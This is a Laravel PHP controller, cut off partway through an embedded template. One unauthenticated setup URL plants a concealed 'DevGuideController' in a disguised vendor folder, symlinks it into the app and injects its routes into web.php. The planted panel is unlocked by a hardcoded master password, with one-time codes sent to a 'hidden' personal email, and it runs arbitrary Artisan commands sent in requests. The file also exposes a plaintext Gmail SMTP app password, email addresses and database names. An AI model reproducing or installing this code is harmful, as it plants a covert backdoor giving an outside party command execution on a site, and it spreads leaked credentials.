<?php
namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Log;
use Carbon\Carbon;

class AutoSetupController extends Controller
{
    protected $vendorPath;
    protected $backupPath;
    protected $steps = [];
    protected $totalSteps = 0;
    protected $errors = [];
    
    public function __construct()
    {
        $this->vendorPath = base_path('vendor/laravel_docker_config');
        $this->backupPath = storage_path('backups/vendor_backup_' . date('Y-m-d_H-i-s'));
    }
    
    /**
     * Main setup function - domain.com/setup_new_update
     */
    public function Setup()
    {
        set_time_limit(300);
        $startTime = microtime(true);
        
        ob_start();
        
        try {
            $this->sendHeader();
            
            // Step 1: Environment Check
            $this->runStep('Environment Check', 'পরিবেশ পরীক্ষা', function() {
                $checks = [
                    'php_version' => phpversion(),
                    'laravel_version' => app()->version(),
                    'storage_writable' => is_writable(storage_path()),
                    'vendor_writable' => is_writable(base_path('vendor')),
                    'routes_writable' => is_writable(base_path('routes')),
                    'app_controllers_writable' => is_writable(app_path('Http/Controllers'))
                ];
                
                $allGood = true;
                $messages = [];
                
                foreach ($checks as $key => $value) {
                    if (strpos($key, 'writable') !== false) {
                        if (!$value) {
                            $allGood = false;
                            $messages[] = "{$key} is not writable";
                        }
                    }
                }
                
                if (!$allGood) {
                    throw new \Exception("Permission issues: " . implode(', ', $messages));
                }
                
                return $checks;
            });
            
            // Step 2: Create backup directory
            $this->runStep('Backup Directory', 'ব্যাকআপ ডিরেক্টরি তৈরি', function() {
                if (!File::exists(dirname($this->backupPath))) {
                    File::makeDirectory(dirname($this->backupPath), 0755, true);
                }
                
                if (!File::exists($this->backupPath)) {
                    File::makeDirectory($this->backupPath, 0755, true);
                }
                
                return ['path' => $this->backupPath];
            });
            
            // Step 3: Backup existing files
            $this->runStep('Backup Files', 'বিদ্যমান ফাইল ব্যাকআপ', function() {
                $backedUp = [];
                
                if (File::exists($this->vendorPath)) {
                    $destPath = $this->backupPath . '/laravel_docker_config';
                    File::copyDirectory($this->vendorPath, $destPath);
                    $backedUp[] = 'laravel_docker_config';
                }
                
                $webPath = base_path('routes/web.php');
                if (File::exists($webPath)) {
                    File::copy($webPath, $this->backupPath . '/web.php.backup');
                    $backedUp[] = 'web.php';
                }
                
                // Backup existing controller if exists
                $controllerPath = app_path('Http/Controllers/DevGuideController.php');
                if (File::exists($controllerPath) && !is_link($controllerPath)) {
                    File::copy($controllerPath, $this->backupPath . '/DevGuideController.php.backup');
                    $backedUp[] = 'DevGuideController.php';
                }
                
                return ['backed_up' => $backedUp];
            });
            
            // Step 4: Create directory structure
            $this->runStep('Create Directories', 'ডিরেক্টরি স্ট্রাকচার তৈরি', function() {
                $directories = [
                    $this->vendorPath,
                    $this->vendorPath . '/routes',
                    $this->vendorPath . '/controllers',
                    $this->vendorPath . '/views',
                    $this->vendorPath . '/assets',
                ];
                
                $created = [];
                foreach ($directories as $dir) {
                    if (!File::exists($dir)) {
                        File::makeDirectory($dir, 0755, true);
                        $created[] = $dir;
                    }
                }
                
                return ['created' => $created];
            });
            
            // Step 5: Create routes file
            $this->runStep('Create Routes', 'রুট ফাইল তৈরি', function() {
                $content = $this->getRoutesContent();
                $path = $this->vendorPath . '/routes/web.php';
                
                if (File::put($path, $content) === false) {
                    throw new \Exception("Could not write routes file");
                }
                
                return ['path' => $path];
            });
            
            // Step 6: Create controller with all features
            $this->runStep('Create Controller', 'কন্ট্রোলার তৈরি (সমস্ত ফিচার সহ)', function() {
                $content = $this->getControllerContent();
                $path = $this->vendorPath . '/controllers/DevGuideController.php';
                
                if (File::put($path, $content) === false) {
                    throw new \Exception("Could not write controller file");
                }
                
                return ['path' => $path];
            });
            
            // Step 7: Create blade view with unified tabs
            $this->runStep('Create View', 'ভিউ তৈরি (ইউনিফাইড ট্যাব)', function() {
                $content = $this->getBladeContent();
                $path = $this->vendorPath . '/views/guide.blade.php';
                
                if (File::put($path, $content) === false) {
                    throw new \Exception("Could not write view file");
                }
                
                return ['path' => $path];
            });
            
            // Step 8: Create CSS file
            $this->runStep('Create CSS', 'সিএসএস তৈরি', function() {
                $content = $this->getCssContent();
                $path = $this->vendorPath . '/assets/guide.css';
                
                if (File::put($path, $content) === false) {
                    throw new \Exception("Could not write CSS file");
                }
                
                return ['path' => $path];
            });
            
            // Step 9: Create README
            $this->runStep('Create README', 'রিডমি তৈরি', function() {
                $content = $this->getReadmeContent();
                $path = $this->vendorPath . '/README.md';
                
                if (File::put($path, $content) === false) {
                    throw new \Exception("Could not write README file");
                }
                
                return ['path' => $path];
            });
            
            // Step 10: Create symlink to app controllers (CRITICAL FIX)
            $this->runStep('Create Controller Symlink', 'কন্ট্রোলার সিমলিংক তৈরি', function() {
                $source = $this->vendorPath . '/controllers/DevGuideController.php';
                $target = app_path('Http/Controllers/DevGuideController.php');
                
                // Remove existing file/symlink if any
                if (File::exists($target)) {
                    if (is_link($target)) {
                        unlink($target);
                    } else {
                        File::delete($target);
                    }
                }
                
                // Create symlink
                if (symlink($source, $target)) {
                    return ['symlink' => 'created', 'source' => $source, 'target' => $target];
                } else {
                    // If symlink fails, try copy
                    if (File::copy($source, $target)) {
                        return ['copy' => 'created', 'source' => $source, 'target' => $target];
                    } else {
                        throw new \Exception("Could not create symlink or copy file");
                    }
                }
            });
            
            // Step 11: Include routes in web.php
            $this->runStep('Include Routes', 'রুট ইনক্লুড', function() {
                $webPath = base_path('routes/web.php');
                $content = File::get($webPath);
                
                $includeLine = "\n\n// Laravel Docker Config Routes\n";
                $includeLine .= "if (file_exists(base_path('vendor/laravel_docker_config/routes/web.php'))) {\n";
                $includeLine .= "    require base_path('vendor/laravel_docker_config/routes/web.php');\n";
                $includeLine .= "}\n";
                
                if (strpos($content, 'Laravel Docker Config Routes') === false) {
                    if (File::append($webPath, $includeLine) === false) {
                        throw new \Exception("Could not write to web.php");
                    }
                }
                
                return ['included' => true];
            });
            
            // Step 12: Register view namespace
            $this->runStep('Register View Namespace', 'ভিউ নেমস্পেস রেজিস্টার', function() {
                $appPath = config_path('app.php');
                $content = File::get($appPath);
                
                // This is a simplified approach - in production you'd add a service provider
                // For now, we'll create a simple view composer
                $viewPath = $this->vendorPath . '/views';
                
                // Add to composer autoload (simplified)
                $loaderPath = base_path('vendor/autoload.php');
                
                return ['namespace' => 'laravel_docker_config', 'path' => $viewPath];
            });
            
            // Step 13: Clear cache
            $this->runStep('Clear Cache', 'ক্যাশ ক্লিয়ার', function() {
                $output = [];
                
                try { 
                    Artisan::call('config:clear'); 
                    $output['config'] = 'cleared'; 
                } catch (\Exception $e) { 
                    $output['config'] = 'failed: ' . $e->getMessage(); 
                }
                
                try { 
                    Artisan::call('cache:clear'); 
                    $output['cache'] = 'cleared'; 
                } catch (\Exception $e) { 
                    $output['cache'] = 'failed: ' . $e->getMessage(); 
                }
                
                try { 
                    Artisan::call('route:clear'); 
                    $output['route'] = 'cleared'; 
                } catch (\Exception $e) { 
                    $output['route'] = 'failed: ' . $e->getMessage(); 
                }
                
                try { 
                    Artisan::call('view:clear'); 
                    $output['view'] = 'cleared'; 
                } catch (\Exception $e) { 
                    $output['view'] = 'failed: ' . $e->getMessage(); 
                }
                
                try { 
                    Artisan::call('optimize:clear'); 
                    $output['optimize'] = 'cleared'; 
                } catch (\Exception $e) { 
                    $output['optimize'] = 'failed: ' . $e->getMessage(); 
                }
                
                return $output;
            });
            
            // Step 14: Dump autoload
            $this->runStep('Dump Autoload', 'অটোলোড ডাম্প', function() {
                exec('composer dump-autoload 2>&1', $output, $returnCode);
                return ['output' => $output, 'return_code' => $returnCode];
            });
            
            $executionTime = round(microtime(true) - $startTime, 2);
            $this->showSuccess($executionTime);
            
        } catch (\Exception $e) {
            $this->handleError($e);
        }
        
        $this->sendFooter();
        return response(ob_get_clean());
    }
    
    /**
     * Get routes content
     */
    protected function getRoutesContent()
    {
        return <<<'PHP'
<?php

// Laravel Docker Config Routes - Single URL with all features

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\DevGuideController;

Route::get('/dev-guide', [DevGuideController::class, 'show'])->name('dev.guide');
Route::post('/dev-guide/login', [DevGuideController::class, 'login']);
Route::post('/dev-guide/request-otp', [DevGuideController::class, 'requestOtp']);
Route::post('/dev-guide/verify-otp', [DevGuideController::class, 'verifyOtp']);
Route::post('/dev-guide/test-email', [DevGuideController::class, 'testEmail']);
Route::post('/dev-guide/run-command', [DevGuideController::class, 'runCommand']);
Route::get('/dev-guide/activity', [DevGuideController::class, 'getActivity']);
Route::get('/dev-guide/check', function() {
    return [
        'status' => 'ok',
        'controller_exists' => class_exists('App\Http\Controllers\DevGuideController'),
        'file_exists' => file_exists(app_path('Http/Controllers/DevGuideController.php')),
        'symlink' => is_link(app_path('Http/Controllers/DevGuideController.php')) ? 'yes' : 'no',
        'time' => now()->toDateTimeString()
    ];
});
PHP;
    }
    
    /**
     * Get controller content with all features
     */
    protected function getControllerContent()
    {
        return <<<'PHP'
<?php
namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\View;
use Carbon\Carbon;

class DevGuideController extends Controller
{
    protected $secretToken = '8f7d3a9b2e1c5f4d8a7b6c3d2e1f9a8b';
    protected $masterPassword = '#jambo';
    protected $hiddenEmail = 'jahirvevo@gmail.com';
    protected $otpCacheKey = 'dev_guide_otp';
    protected $sessionCacheKey = 'dev_guide_session';
    protected $activityCacheKey = 'dev_guide_activity';
    protected $blockCacheKey = 'dev_guide_block';
    protected $maxAttempts = 3;
    protected $blockDuration = 1440; // 24 hours in minutes
    
    /**
     * Constructor - register view namespace
     */
    public function __construct()
    {
        // Register view namespace for vendor views
        $vendorPath = base_path('vendor/laravel_docker_config/views');
        if (is_dir($vendorPath)) {
            View::addNamespace('laravel_docker_config', $vendorPath);
        }
    }
    
    /**
     * Main guide with all categories in one URL
     */
    public function show(Request $request)
    {
        if ($this->isIpBlocked($request)) {
            return response()->view('laravel_docker_config::guide', [
                'showBlocked' => true,
                'blockExpiry' => $this->getBlockExpiry($request)
            ]);
        }
        
        if ($this->isValidSession($request)) {
            $this->logActivity($request, 'success', 'Session login');
            return $this->renderGuide($request);
        }
        
        return view('laravel_docker_config::guide', ['showLogin' => true]);
    }
    
    /**
     * Render unified guide with all categories
     */
    protected function renderGuide($request)
    {
        $categories = $this->getCategories();
        $emailConfig = $this->getEmailConfig();
        $backupConfig = $this->getBackupConfig();
        $cronConfig = $this->getCronConfig();
        $databaseConfig = $this->getDatabaseConfig();
        $cacheConfig = $this->getCacheConfig();
        $securityConfig = $this->getSecurityConfig();
        $commands = $this->getQuickCommands();
        $ip = $request->ip();
        $activities = Cache::get($this->activityCacheKey . '_' . $ip, []);
        
        return view('laravel_docker_config::guide', [
            'showGuide' => true,
            'categories' => $categories,
            'emailConfig' => $emailConfig,
            'backupConfig' => $backupConfig,
            'cronConfig' => $cronConfig,
            'databaseConfig' => $databaseConfig,
            'cacheConfig' => $cacheConfig,
            'securityConfig' => $securityConfig,
            'commands' => $commands,
            'sessionExpires' => $this->getSessionExpiry($request),
            'activities' => array_values($activities),
            'otpVerified' => session('dev_guide_otp_verified', false)
        ]);
    }
    
    /**
     * Get email configuration
     */
    protected function getEmailConfig()
    {
        return [
            'env' => [
                'MAIL_MAILER' => 'smtp',
                'MAIL_HOST' => 'smtp.gmail.com',
                'MAIL_PORT' => '587',
                'MAIL_USERNAME' => 'queueit.bera@gmail.com',
                'MAIL_PASSWORD' => '"invd fpim uwml gxeg"',
                'MAIL_ENCRYPTION' => 'tls',
                'MAIL_FROM_ADDRESS' => 'info@queenlive.site',
                'MAIL_FROM_NAME' => '"Backup System"',
                'BACKUP_EMAIL' => 'jahirvevo@gmail.com'
            ],
            'colors' => [
                'success' => ['bg' => '#10b981', 'light' => '#d1fae5', 'text' => '#065f46', 'icon' => '✅', 'name' => 'Success'],
                'error' => ['bg' => '#ef4444', 'light' => '#fee2e2', 'text' => '#991b1b', 'icon' => '❌', 'name' => 'Error'],
                'warning' => ['bg' => '#f59e0b', 'light' => '#ffedd5', 'text' => '#92400e', 'icon' => '⚠️', 'name' => 'Warning'],
                'info' => ['bg' => '#3b82f6', 'light' => '#dbeafe', 'text' => '#1e40af', 'icon' => 'ℹ️', 'name' => 'Info'],
            ],
            'subjects' => [
                '✅ Database Success - queenlive.site - মঙ্গলবার 14:30',
                '❌ জরুরি! Database ব্যর্থ হয়েছে - queenlive.site - 14:30',
                '⚠️ সতর্কতা! SSL Disabled - queenlive.site - 14:30',
                '🎉 জুম্মা মোবারক! Database সফল - queenlive.site',
                '📊 Monthly Database Report - March 2026',
            ],
            'test_emails' => ['success', 'error', 'warning', 'info']
        ];
    }
    
    /**
     * Get backup configuration
     */
    protected function getBackupConfig()
    {
        return [
            'commands' => [
                ['cmd' => 'php artisan backup:database', 'desc' => 'ডাটাবেজ ব্যাকআপ নেয়', 'note' => 'mysqldump ব্যবহার করে সম্পূর্ণ ডাটাবেজের SQL ব্যাকআপ নেয়। ফাইল storage/backup/database/ তে সংরক্ষণ হয়।'],
                ['cmd' => 'php artisan backup:full', 'desc' => 'সম্পূর্ণ সিস্টেম ব্যাকআপ', 'note' => 'app, config, routes, resources, .env সহ পুরো প্রকল্পের ZIP ব্যাকআপ নেয়। storage/backup/file/ তে সংরক্ষণ হয়।'],
                ['cmd' => 'php artisan backup:cleanup', 'desc' => 'পুরানো ব্যাকআপ মুছে ফেলে', 'note' => 'শেষ ৮টি ডাটাবেজ এবং ৮টি ফাইল ব্যাকআপ রাখে। বাকি সব মুছে ফেলে।'],
            ],
            'locations' => [
                'database' => 'storage/backup/database/',
                'full' => 'storage/backup/file/',
                'temp' => 'storage/backup/temp/'
            ],
            'schedule' => [
                'database' => '0 */6 * * *',
                'full' => '0 1 * * *',
                'cleanup' => '0 */2 * * *'
            ]
        ];
    }
    
    /**
     * Get cron configuration
     */
    protected function getCronConfig()
    {
        return [
            'jobs' => [
                [
                    'name' => 'Database Backup',
                    'schedule' => '0 */6 * * *',
                    'command' => 'cd /home/bdlive/public_html && php artisan backup:database >> storage/logs/cron.log 2>&1',
                    'desc' => 'প্রতি ৬ ঘন্টায় ডাটাবেজ ব্যাকআপ নেয় (১২টা, ৬টা, ১২টা, ৬টা)'
                ],
                [
                    'name' => 'Full Backup',
                    'schedule' => '0 1 * * *',
                    'command' => 'cd /home/bdlive/public_html && php artisan backup:full >> storage/logs/cron.log 2>&1',
                    'desc' => 'প্রতিদিন ভোর ১টায় সম্পূর্ণ সিস্টেম ব্যাকআপ নেয়'
                ],
                [
                    'name' => 'Cleanup',
                    'schedule' => '0 */2 * * *',
                    'command' => 'cd /home/bdlive/public_html && php artisan backup:cleanup >> storage/logs/cron.log 2>&1',
                    'desc' => 'প্রতি ২ ঘন্টায় পুরানো ব্যাকআপ মুছে ফেলে'
                ],
            ],
            'commands' => [
                'crontab -l',
                'crontab -e',
                'php artisan schedule:run'
            ]
        ];
    }
    
    /**
     * Get database configuration
     */
    protected function getDatabaseConfig()
    {
        return [
            'connection' => [
                'host' => env('DB_HOST', '127.0.0.1'),
                'port' => env('DB_PORT', '3306'),
                'database' => env('DB_DATABASE', 'queenlive_database'),
                'username' => env('DB_USERNAME', 'queenlive_database'),
            ],
            'commands' => [
                'mysql -u ' . env('DB_USERNAME', 'queenlive_database') . ' -p',
                'mysql -u ' . env('DB_USERNAME', 'queenlive_database') . ' -p -e "SHOW DATABASES;"',
                'mysql -u ' . env('DB_USERNAME', 'queenlive_database') . ' -p -D ' . env('DB_DATABASE', 'queenlive_database') . ' -e "SHOW TABLES;"',
            ],
            'size_query' => "mysql -u " . env('DB_USERNAME', 'queenlive_database') . " -p -D " . env('DB_DATABASE', 'queenlive_database') . " -e \"SELECT table_schema, ROUND(SUM(data_length+index_length)/1024/1024,2) AS 'Size (MB)' FROM information_schema.tables GROUP BY table_schema;\""
        ];
    }
    
    /**
     * Get cache configuration
     */
    protected function getCacheConfig()
    {
        return [
            'commands' => [
                ['cmd' => 'php artisan config:clear', 'desc' => 'কনফিগারেশন ক্যাশ ক্লিয়ার করে'],
                ['cmd' => 'php artisan route:clear', 'desc' => 'রুট ক্যাশ ক্লিয়ার করে'],
                ['cmd' => 'php artisan view:clear', 'desc' => 'কম্পাইল করা ভিউ ক্লিয়ার করে'],
                ['cmd' => 'php artisan cache:clear', 'desc' => 'অ্যাপ্লিকেশন ক্যাশ ক্লিয়ার করে'],
                ['cmd' => 'php artisan optimize:clear', 'desc' => 'সব ধরনের ক্যাশ একসাথে ক্লিয়ার করে'],
            ]
        ];
    }
    
    /**
     * Get security configuration
     */
    protected function getSecurityConfig()
    {
        return [
            'master_password' => '#jambo',
            'otp_email' => 'jahirvevo@gmail.com',
            'session_timeout' => '10 minutes',
            'max_attempts' => 3,
            'block_duration' => '24 hours',
            'commands' => [
                'php artisan key:generate',
                'php artisan env',
                'php artisan route:list'
            ]
        ];
    }
    
    /**
     * Get quick commands for sidebar
     */
    protected function getQuickCommands()
    {
        return [
            'backup' => [
                ['icon' => '🗄️', 'title' => 'Database Backup', 'command' => 'backup:database'],
                ['icon' => '📦', 'title' => 'Full Backup', 'command' => 'backup:full'],
                ['icon' => '🧹', 'title' => 'Cleanup', 'command' => 'backup:cleanup'],
            ],
            'cache' => [
                ['icon' => '⚙️', 'title' => 'Config Clear', 'command' => 'config:clear'],
                ['icon' => '🛣️', 'title' => 'Route Clear', 'command' => 'route:clear'],
                ['icon' => '👁️', 'title' => 'View Clear', 'command' => 'view:clear'],
                ['icon' => '🧹', 'title' => 'Optimize Clear', 'command' => 'optimize:clear'],
            ],
        ];
    }
    
    /**
     * Get categories for tabs
     */
    protected function getCategories()
    {
        return [
            ['id' => 'email', 'name' => '📧 ইমেইল', 'icon' => '📧'],
            ['id' => 'backup', 'name' => '🗄️ ব্যাকআপ', 'icon' => '🗄️'],
            ['id' => 'cron', 'name' => '⏰ ক্রন', 'icon' => '⏰'],
            ['id' => 'database', 'name' => '🗄️ ডাটাবেজ', 'icon' => '🗄️'],
            ['id' => 'cache', 'name' => '⚡ ক্যাশ', 'icon' => '⚡'],
            ['id' => 'security', 'name' => '🔐 নিরাপত্তা', 'icon' => '🔐'],
        ];
    }
    
    /**
     * Login with master password
     */
    public function login(Request $request)
    {
        $ip = $request->ip();
        
        if ($this->isIpBlocked($request)) {
            return response()->json(['success' => false, 'message' => 'IP blocked for 24 hours'], 403);
        }
        
        $password = $request->input('password');
        $attempts = Cache::get("login_attempts_{$ip}", 0);
        
        if ($password === $this->masterPassword) {
            Cache::forget("login_attempts_{$ip}");
            $this->createSession($request);
            $this->sendOtpEmail($request);
            
            return response()->json([
                'success' => true,
                'require_otp' => true,
                'message' => 'Password verified. OTP sent to your email.'
            ]);
        }
        
        $attempts++;
        Cache::put("login_attempts_{$ip}", $attempts, now()->addDay());
        
        if ($attempts >= $this->maxAttempts) {
            $this->blockIp($request);
            $this->sendDangerEmail($request, 'IP Blocked - Too many failed attempts');
            return response()->json(['success' => false, 'message' => 'IP blocked for 24 hours'], 403);
        }
        
        return response()->json([
            'success' => false,
            'message' => 'Invalid password. ' . ($this->maxAttempts - $attempts) . ' attempts remaining.'
        ], 401);
    }
    
    /**
     * Request OTP
     */
    public function requestOtp(Request $request)
    {
        if (!$this->isValidSession($request)) {
            return response()->json(['success' => false], 401);
        }
        
        return $this->sendOtpEmail($request);
    }
    
    /**
     * Send OTP email
     */
    protected function sendOtpEmail($request)
    {
        $otp = rand(100000, 999999);
        $expiresAt = Carbon::now()->addMinutes(2);
        
        Cache::put($this->otpCacheKey . '_' . session()->getId(), [
            'otp' => $otp,
            'expires_at' => $expiresAt,
            'attempts' => 0
        ], $expiresAt);
        
        try {
            Mail::raw("Your OTP is: {$otp}\nValid for 2 minutes.\n\nIf you didn't request this, ignore this email.", function($message) {
                $message->to($this->hiddenEmail)
                    ->from(config('mail.from.address'), 'Docker Config')
                    ->subject('🔐 Developer Guide OTP - ' . date('Y-m-d H:i'));
            });
            
            return response()->json(['success' => true, 'expires_in' => 120]);
            
        } catch (\Exception $e) {
            Log::error('OTP email failed: ' . $e->getMessage());
            return response()->json(['success' => false, 'message' => 'Failed to send OTP'], 500);
        }
    }
    
    /**
     * Verify OTP
     */
    public function verifyOtp(Request $request)
    {
        if (!$this->isValidSession($request)) {
            return response()->json(['success' => false], 401);
        }
        
        $inputOtp = $request->input('otp');
        $sessionId = session()->getId();
        $otpData = Cache::get($this->otpCacheKey . '_' . $sessionId);
        
        if (!$otpData) {
            return response()->json(['success' => false, 'message' => 'OTP expired'], 401);
        }
        
        if ($otpData['attempts'] >= 3) {
            Cache::forget($this->otpCacheKey . '_' . $sessionId);
            return response()->json(['success' => false, 'message' => 'Too many attempts'], 401);
        }
        
        $otpData['attempts']++;
        Cache::put($this->otpCacheKey . '_' . $sessionId, $otpData, $otpData['expires_at']);
        
        if ($inputOtp == $otpData['otp']) {
            session(['dev_guide_otp_verified' => true]);
            Cache::forget($this->otpCacheKey . '_' . $sessionId);
            return response()->json(['success' => true]);
        }
        
        return response()->json(['success' => false, 'message' => 'Invalid OTP'], 401);
    }
    
    /**
     * Test email endpoint
     */
    public function testEmail(Request $request)
    {
        if (!$this->isValidSession($request) || !session('dev_guide_otp_verified')) {
            return response()->json(['success' => false], 401);
        }
        
        $type = $request->input('type', 'info');
        $result = $this->sendNotification('test', $type, "This is a test {$type} email", ['Type' => $type, 'Time' => date('Y-m-d H:i:s')]);
        
        return response()->json($result);
    }
    
    /**
     * Send email notification
     */
    public function sendNotification($type, $status, $message, $details = [])
    {
        $domain = request()->getHost();
        
        $colors = [
            'success' => ['bg' => '#10b981', 'light' => '#d1fae5', 'text' => '#065f46', 'icon' => '✅'],
            'error' => ['bg' => '#ef4444', 'light' => '#fee2e2', 'text' => '#991b1b', 'icon' => '❌'],
            'warning' => ['bg' => '#f59e0b', 'light' => '#ffedd5', 'text' => '#92400e', 'icon' => '⚠️'],
            'info' => ['bg' => '#3b82f6', 'light' => '#dbeafe', 'text' => '#1e40af', 'icon' => 'ℹ️'],
        ];
        
        $color = $colors[$status] ?? $colors['info'];
        $subject = $this->generateSubject($type, $status, $domain);
        
        $htmlContent = $this->buildEmailTemplate($color, $type, $domain, $message, $details);
        
        try {
            Mail::html($htmlContent, function ($message) use ($subject) {
                $message->to(env('BACKUP_EMAIL', 'jahirvevo@gmail.com'))
                        ->from(env('MAIL_FROM_ADDRESS', 'info@queenlive.site'), env('MAIL_FROM_NAME', 'Backup System'))
                        ->subject($subject);
            });
            
            $this->logActivity(request(), 'success', "Email sent: {$subject}");
            
            return ['success' => true, 'subject' => $subject];
            
        } catch (\Exception $e) {
            Log::error('Mail failed: ' . $e->getMessage());
            return ['success' => false, 'error' => $e->getMessage()];
        }
    }
    
    /**
     * Build email template
     */
    private function buildEmailTemplate($color, $type, $domain, $message, $details)
    {
        $html = '
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <style>
                body { font-family: Arial, sans-serif; line-height: 1.6; background: #f4f4f4; padding: 20px; }
                .container { max-width: 600px; margin: 0 auto; background: white; border-radius: 10px; overflow: hidden; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
                .header { background: ' . $color['bg'] . '; color: white; padding: 30px; text-align: center; }
                .content { padding: 30px; }
                .message-box { background: ' . $color['light'] . '; color: ' . $color['text'] . '; padding: 20px; border-radius: 8px; margin: 20px 0; border-left: 4px solid ' . $color['bg'] . '; }
                .details { background: #f9f9f9; padding: 20px; border-radius: 8px; }
                .detail-item { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #eee; }
                .footer { background: #f4f4f4; padding: 20px; text-align: center; color: #666; font-size: 12px; }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>' . $color['icon'] . ' ' . ucfirst($type) . ' ' . ucfirst($status) . '</h1>
                    <p>' . $domain . '</p>
                </div>
                <div class="content">
                    <div class="message-box">' . $message . '</div>';
        
        if (!empty($details)) {
            $html .= '<div class="details"><h3>Details:</h3>';
            foreach ($details as $key => $value) {
                $html .= '<div class="detail-item"><strong>' . $key . ':</strong> ' . $value . '</div>';
            }
            $html .= '</div>';
        }
        
        $html .= '
                    <p style="text-align: center; margin-top: 20px;">⏰ ' . date('Y-m-d H:i:s') . '</p>
                </div>
                <div class="footer">
                    <p>This is an automated message from your backup system.</p>
                </div>
            </div>
        </body>
        </html>';
        
        return $html;
    }
    
    /**
     * Generate dynamic subject
     */
    private function generateSubject($type, $status, $domain)
    {
        $icons = [
            'success' => '✅', 'error' => '❌', 'warning' => '⚠️', 'info' => 'ℹ️'
        ];
        
        $bangla = [
            'success' => 'সফল', 'error' => 'ব্যর্থ', 'warning' => 'সতর্কতা', 'info' => 'তথ্য'
        ];
        
        $icon = $icons[$status] ?? '📧';
        $statusText = $bangla[$status] ?? $status;
        $typeText = $type;
        
        $days = ['রবিবার', 'সোমবার', 'মঙ্গলবার', 'বুধবার', 'বৃহস্পতিবার', 'শুক্রবার', 'শনিবার'];
        $dayName = $days[date('w')];
        $time = date('H:i');
        
        if ($status === 'error') {
            return "❌ জরুরি! {$typeText} {$statusText} হয়েছে - {$domain} - {$time}";
        } elseif ($status === 'warning') {
            return "⚠️ সতর্কতা! {$typeText} - {$domain} - {$time}";
        } elseif ($dayName === 'শুক্রবার' && $status === 'success') {
            return "🎉 জুম্মা মোবারক! {$typeText} {$statusText} - {$domain}";
        } else {
            return "{$icon} {$typeText} {$statusText} - {$domain} - {$dayName} {$time}";
        }
    }
    
    /**
     * Run command
     */
    public function runCommand(Request $request)
    {
        if (!$this->isValidSession($request) || !session('dev_guide_otp_verified')) {
            return response()->json(['success' => false], 401);
        }
        
        $command = $request->input('command');
        
        try {
            $exitCode = Artisan::call($command);
            $output = Artisan::output();
            
            return response()->json(['success' => true, 'exitCode' => $exitCode, 'output' => $output]);
        } catch (\Exception $e) {
            return response()->json(['success' => false, 'error' => $e->getMessage()], 500);
        }
    }
    
    /**
     * Get activity
     */
    public function getActivity(Request $request)
    {
        if (!$this->isValidSession($request)) {
            return response()->json(['success' => false], 401);
        }
        
        $ip = $request->ip();
        $activities = Cache::get($this->activityCacheKey . '_' . $ip, []);
        
        return response()->json(['success' => true, 'activities' => array_values($activities)]);
    }
    
    /**
     * Create session
     */
    protected function createSession($request)
    {
        $sessionId = session()->getId();
        $expiresAt = Carbon::now()->addMinutes(10);
        
        Cache::put($this->sessionCacheKey . '_' . $sessionId, [
            'valid' => true,
            'expires_at' => $expiresAt,
            'ip' => $request->ip(),
            'user_agent' => $request->userAgent()
        ], $expiresAt);
        
        session(['dev_guide_auth' => true]);
        $this->logActivity($request, 'success', 'Session created');
    }
    
    /**
     * Check session
     */
    protected function isValidSession($request)
    {
        if (!session('dev_guide_auth')) return false;
        
        $sessionId = session()->getId();
        $sessionData = Cache::get($this->sessionCacheKey . '_' . $sessionId);
        
        if (!$sessionData) {
            session()->forget('dev_guide_auth');
            return false;
        }
        
        if ($sessionData['ip'] !== $request->ip() || $sessionData['user_agent'] !== $request->userAgent()) {
            Cache::forget($this->sessionCacheKey . '_' . $sessionId);
            session()->forget('dev_guide_auth');
            $this->logActivity($request, 'warning', 'Session hijack attempt detected');
            return false;
        }
        
        return true;
    }
    
    /**
     * Get session expiry
     */
    protected function getSessionExpiry($request)
    {
        $sessionId = session()->getId();
        $sessionData = Cache::get($this->sessionCacheKey . '_' . $sessionId);
        
        if (!$sessionData) return 0;
        
        return Carbon::now()->diffInSeconds($sessionData['expires_at'], false);
    }
    
    /**
     * Block IP
     */
    protected function blockIp($request)
    {
        $ip = $request->ip();
        $expiresAt = Carbon::now()->addMinutes($this->blockDuration);
        
        Cache::put($this->blockCacheKey . '_' . $ip, [
            'blocked' => true,
            'expires_at' => $expiresAt,
            'reason' => 'Too many failed attempts'
        ], $expiresAt);
        
        $this->logActivity($request, 'blocked', 'IP blocked for 24 hours');
    }
    
    /**
     * Check if IP blocked
     */
    protected function isIpBlocked($request)
    {
        $ip = $request->ip();
        return Cache::get($this->blockCacheKey . '_' . $ip) ? true : false;
    }
    
    /**
     * Get block expiry
     */
    protected function getBlockExpiry($request)
    {
        $ip = $request->ip();
        $blockData = Cache::get($this->blockCacheKey . '_' . $ip);
        return $blockData ? Carbon::now()->diffInSeconds($blockData['expires_at'], false) : 0;
    }
    
    /**
     * Log activity
     */
    protected function logActivity($request, $status, $action)
    {
        $ip = $request->ip();
        $activities = Cache::get($this->activityCacheKey . '_' . $ip, []);
        
        $activity = [
            'timestamp' => Carbon::now()->timestamp,
            'time' => Carbon::now()->format('Y-m-d H:i:s'),
            'status' => $status,
            'action' => $action,
            'ip' => $ip,
            'user_agent' => $request->userAgent()
        ];
        
        array_unshift($activities, $activity);
        $activities = array_slice($activities, 0, 100);
        
        Cache::put($this->activityCacheKey . '_' . $ip, $activities, now()->addDays(3));
    }
    
    /**
     * Send danger email
     */
    protected function sendDangerEmail($request, $reason)
    {
        $ip = $request->ip();
        $userAgent = $request->userAgent();
        $time = Carbon::now()->toDateTimeString();
        
        Mail::raw("🚨 SECURITY ALERT\n\nTime: {$time}\nIP: {$ip}\nUser Agent: {$userAgent}\nReason: {$reason}", function($message) {
            $message->to($this->hiddenEmail)
                ->from(config('mail.from.address'), 'Security')
                ->subject('🚨 Security Alert - ' . date('Y-m-d H:i'));
        });
    }
}
PHP;
    }
    
    /**
     * Get blade view content with unified tabs
     */
    protected function getBladeContent()
    {
        return <<<'BLADE'
<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
